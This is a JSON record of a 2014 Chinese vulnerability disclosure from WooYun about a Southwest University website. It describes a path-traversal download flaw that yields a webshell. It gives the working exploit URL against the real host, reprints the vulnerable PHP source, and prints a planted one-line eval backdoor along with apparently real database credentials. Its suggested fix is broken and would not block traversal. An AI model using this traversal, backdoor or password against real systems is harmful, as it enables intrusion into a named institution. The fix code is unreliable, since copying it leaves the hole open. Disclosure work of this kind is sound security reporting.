{"id": 57209, "wybug_id": "wooyun-2014-055028", "wybug_title": "西南大学某站任意文件下载可getshell", "wybug_corp": "西南大学", "wybug_author": "nextdoor", "wybug_date": "2014-04-04 12:05", "wybug_open_date": "2014-05-19 12:06", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向公众公开  简要描述： 西南大学某站任意文件下载可getshell 详细说明：  任意文件下载的链接http://jyxy.swu.edu.cn/down.php?file_name=../../index.php下载了一个down.php看看down.php没有做任何的判断和过滤导致任意文件下载down.php\n<?/*down.php文件*/$file_name=$_GET[file_name];$file_dir = \"./upload/images/\";  //文件存放位置if (!file_exists($file_dir . $file_name)) { //检查文件是否存在，仅仅检测了文件是否存在，而没有检测数据的合法性echo \"文件找不到\";exit; } else {$file = fopen($file_dir . $file_name,\"r\"); // 打开文件 // 输入文件标签Header(\"Content-type: application/octet-stream\");Header(\"Accept-Ranges: bytes\");Header(\"Accept-Length: \".filesize($file_dir . $file_name));Header(\"Content-Disposition: attachment; filename=\" . $file_name);// 输出文件内容echo fread($file,filesize($file_dir . $file_name));fclose($file);exit;} ?>\n看看主页代码，发现包含include/init.php这个应该是初始化文件，可能放着我们的mysql用户名和密码，远程连接就可以导出我们的一句话木马shell了，下载下看看index.php\n<?phpinclude_once(\"include/init.php\");$news = array();$jiaoxue = array();$xueshu = array();$student = array();$pic = array();$search = array();$url1 = array();$url2 = array();$url3 = array();//gonggao$rs = $DB->Execute(\"select message from gonggao\");$row=$rs->FetchRow();$gonggao = stripslashes($row['message']);//news$rs = $DB->Execute(\"select aid,subject,created from article where sortid=15 and imgurl='' order by created desc limit 0,6\");while($row=$rs->FetchRow()){\t$tmp['aid'] = $row['aid'];\t$tmp['subject'] = $row['subject'];\t$tmp['created'] = date(\"m-d\",$row['created']);\t$news[] = $tmp;}//jiaoxue$rs = $DB->Execute(\"select aid,subject,created from article where sortid=17 and imgurl='' order by created desc limit 0,6\");while($row=$rs->FetchRow()){\t$tmp['aid'] = $row['aid'];\t$tmp['subject'] = $row['subject'];\t$tmp['created'] = date(\"m-d\",$row['created']);\t$jiaoxue[] = $tmp;}//xueshu$rs = $DB->Execute(\"select aid,subject,created from article where sortid=16 and imgurl='' order by created desc limit 0,6\");while($row=$rs->FetchRow()){\t$tmp['aid'] = $row['aid'];\t$tmp['subject'] = $row['subject'];\t$tmp['created'] = date(\"m-d\",$row['created']);\t$xueshu[] = $tmp;}//student......?>\n看到了这个文件，看到了第一句代码，亮了，这不是一句话吗，不知道是开发者的后门还是某个攻击者留下的后门。并找到了我们的数据密码和用户名init.php\n<?php@eval($_POST['c']);  //一句话木马define('ROOT_PATH',str_replace('include/init.php', '', str_replace('\\\\', '/', __FILE__)));define('TPL_PATH',ROOT_PATH.'templates/');define('ROOT','http://jyxy.swu.edu.cn/');define('UPLOAD_PATH',ROOT_PATH.'upload/images/');$config['compile_dir'] = ROOT_PATH.'templates_c/';function newSmarty(){\trequire_once(\"smarty/Smarty.class.php\");\t$TPL = new Smarty();    $TPL->left_delimiter = \"{%\";    $TPL->right_delimiter = \"%}\";    $TPL->caching = false;\t$TPL->template_dir = TPL_PATH;    $TPL->compile_dir = ROOT_PATH.'templates_c/';\treturn $TPL;}function newAdodb($dbName=''){\trequire_once(\"adodb/adodb.inc.php\");\t$DB = ADONewConnection('mysql');\t$DB->Connect('localhost','jyxy_f','jyxy781648','jyxy'); //连接mysql数据库的，还有就是用户名，密码，和数据库了。\t$DB->Execute(\"set names 'gbk'\");\treturn  $DB;}$TPL = newSmarty();$DB = newAdodb();//$DB->debug=true;?>\n由于index.php包含include/init.php故一句话木马直接连接到http://jyxy.swu.edu.cn/index.php就可以了如下图所示：\n\n用户\n\n   漏洞证明：  漏洞证明：\n\n用户\n\n   修复方案：  判断一下传入的用户名是否合法，不要过滤../和./，它们都可以被绕过那个不知道谁写的一句话木马也删除了吧，测试数据和shell一删除加入一下代码\nif (in_array(\"..\" , $file_name)){\techo \"文件名不合法\";\texit;}\n   版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-04-06 19:58 厂商回复： 正在通知相关学校处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}